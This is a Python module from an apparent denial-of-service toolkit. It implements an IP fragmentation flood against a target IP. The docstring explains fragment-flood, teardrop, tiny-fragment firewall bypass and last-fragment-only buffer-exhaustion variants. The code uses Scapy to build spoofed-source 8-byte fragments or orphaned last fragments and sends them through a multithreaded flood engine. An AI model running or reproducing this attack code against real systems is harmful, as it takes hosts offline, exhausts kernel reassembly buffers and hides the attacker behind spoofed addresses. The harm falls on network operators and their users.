"""
modules/ip_frag.py - DROPER
IP fragmentation attack. Exhausts kernel reassembly buffers.

How it works:
  IP allows packets to be fragmented into smaller pieces.
  The receiving kernel must:
    1. Allocate a reassembly buffer (ipq) per fragment group
    2. Hold all fragments until complete (or until timeout, default 30s)
    3. Reassemble and deliver to transport layer

  Attack variants:

  1. Fragment flood (DROPER):
     Send thousands of tiny fragments (MF=1) with random IDs.
     Each fragment group occupies a reassembly buffer slot.
     Linux ipq hash table has limited slots -> overflow -> legitimate packets dropped.
     Kernel metric: /proc/net/snmp -> Ip: ReasmFails

  2. Teardrop (historic, CVE-1999-0015):
     Overlapping fragments with crafted offset values.
     Kernel reassembly bug -> negative memcpy -> kernel panic.
     Patched in all modern kernels. Useful for legacy embedded targets.

  3. Tiny fragment (RFC 791 abuse):
     Force TCP header to span 2 fragments (8-byte first fragment).
     Some packet filters only inspect the first fragment for port numbers.
     -> ACL/firewall bypass on fragmented packets.

  4. Last fragment only:
     Send only the last fragment (MF=0, offset>0), never the first.
     Reassembly never completes -> buffer held until timeout (30s default).
     -> Long-term buffer exhaustion with low bandwidth.

Kernel limits to check on target:
  sysctl net.ipv4.ipfrag_max_dist       # Max fragments before discard
  sysctl net.ipv4.ipfrag_time           # Reassembly timeout (default 30s)
  sysctl net.ipv4.ipfrag_high_thresh    # Max memory for reassembly (bytes)
"""

import random
from floodles.core.packet_builder import PacketBuilder
from floodles.core.sender import FloodEngine


def run(
    dst_ip: str,
    dst_port: int = 80,
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
    spoof: bool = True,
    variant: str = "flood",    # "flood" | "last_only"
) -> FloodEngine:
    """
    Launch IP fragmentation attack.

    Args:
        dst_ip    : Target IP.
        dst_port  : Destination port (embedded in UDP header within fragment).
        threads   : Worker count.
        pps_limit : PPS cap.
        duration  : Duration in seconds.
        spoof     : Randomize source IP.
        variant   : "flood" = tiny fragment storm.
                    "last_only" = only last fragment, maximizes buffer hold time.

    Returns:
        FloodEngine (already started).

    Note:
        ip_frag builder returns a list[bytes] (multiple fragment packets).
        FloodEngine handles list return from packet_fn natively.
    """
    from scapy.all import IP, UDP, Raw, fragment
    import random as _r

    def make_fragments() -> list[bytes]:
        src = None
        if spoof:
            from floodles.core.packet_builder import random_ip
            src = random_ip()

        ip_id = _r.randint(1, 65535)

        if variant == "last_only":
            # Send only the last fragment (offset=184, MF=0)
            # First fragment never arrives -> reassembly hangs for 30s
            from scapy.all import IP, Raw
            pkt = IP(
                src=src, dst=dst_ip,
                id=ip_id,
                flags=0,          # MF=0 (last fragment)
                frag=184,         # Non-zero offset (last fragment)
                proto=17,         # UDP
            ) / Raw(load=b"\x00" * 8)  # Dummy UDP-ish payload
            return [bytes(pkt)]

        else:
            # Standard tiny fragment flood
            pkt = IP(src=src, dst=dst_ip, id=ip_id) / UDP(
                sport=_r.randint(1024, 65535),
                dport=dst_port,
            ) / Raw(load=bytes(_r.getrandbits(8) for _ in range(1400)))
            frags = fragment(pkt, fragsize=8)  # 8-byte frags = max reassembly pressure
            return [bytes(f) for f in frags]

    engine = FloodEngine(
        packet_fn=make_fragments,
        dst_ip=dst_ip,
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
